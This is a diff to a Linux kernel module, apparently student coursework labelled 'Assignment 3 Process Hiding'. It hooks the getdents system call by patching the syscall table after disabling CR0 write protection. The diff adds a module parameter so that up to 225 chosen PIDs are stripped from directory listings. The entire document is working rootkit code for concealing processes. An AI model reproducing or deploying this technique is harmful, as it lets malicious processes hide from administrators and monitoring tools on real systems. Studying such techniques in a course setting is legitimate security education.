@@ -10,6 +10,7 @@
 #include <linux/module.h> /* Needed by all modules */
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
+#include <linux/moduleparam.h>
 #include <linux/sched.h>
 #include <asm/page.h>
 #include <asm/pgtable.h>
@@ -21,8 +22,9 @@
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
 #define DRIVER_DESC   "Assigment 3 Process Hiding"
 
-static int myPIDArray[2] = {2442, 4840};
-static int myPIDArrayLen = 2;
+//static int *myPIDArray;
+static int myPIDArray[225];
+static int myPIDArrayLen = 225;
 /* Structure directory entries */
 struct linux_dirent {
                unsigned long  d_ino;     /* Inode number */
@@ -33,6 +35,9 @@ struct linux_dirent {
 void ** syscall_table = (void * *) sys_call_table_R;
 long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 int r_count=0;
+
+module_param_array(myPIDArray, int, &myPIDArrayLen, 0000);
+MODULE_PARM_DESC(myintArray, "An array of PIDs");
 
 inline void disable_wp(void){
 	write_cr0(read_cr0() & ~0x00010000);
@@ -77,19 +82,20 @@ struct task_struct *get_task(pid_t pid) {
 
 int find_hide_process(pid_t pid){
   int index = 0;
-  struct task_struct *task = get_task(pid);
-  if(task){
-    while(index<myPIDArrayLen){
-      if(myPIDArray[index] == pid){
-        printk(KERN_INFO "I'd like to hid process pid=%d\n",pid);
+  while(index<myPIDArrayLen){
+    if(myPIDArray[index] == pid){
+      printk(KERN_INFO "I'd like to hid process pid=%d\n",pid);
+      if(get_task(pid)){
         return 1;
-        }
-      index++;
+      }else{
+        printk(KERN_INFO "not tast pid=%d\n",pid);
+        return 0;
+      }
     } 
-    return 0;
-  }else{
-  return 0;
+    index++;
   }
+  printk(KERN_INFO "pid=%d\n",pid);
+  return 0;
 }
 
 static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
@@ -116,9 +122,7 @@ static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent,
       if(find_hide_process(atoi(dirent->d_name))){
         memmove(dirent, (char *) dirent + dirent->d_reclen, restLen);
         retVal -= currLen;
-      }
-      //printk(KERN_INFO "pid=%s\n",dirent->d_name);
-      if(restLen){
+      } else if(restLen){
         /* Jump to next entry */
         dirent = (struct linux_dirent *) ((char *)dirent + dirent->d_reclen);
       }
@@ -131,6 +135,13 @@ static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 static int __init mod_init(void)
 {
+  int i;
+  for (i = 0; i < (sizeof myPIDArray / sizeof (int)); i++)
+	{
+		printk(KERN_INFO "myintArray[%d] = %d\n", i, myPIDArray[i]);
+	}
+	printk(KERN_INFO "got %d arguments for myintArray.\n", myPIDArrayLen);
+
   disable_wp(); 
 
   orig_sys_getdents = syscall_table[__NR_getdents];
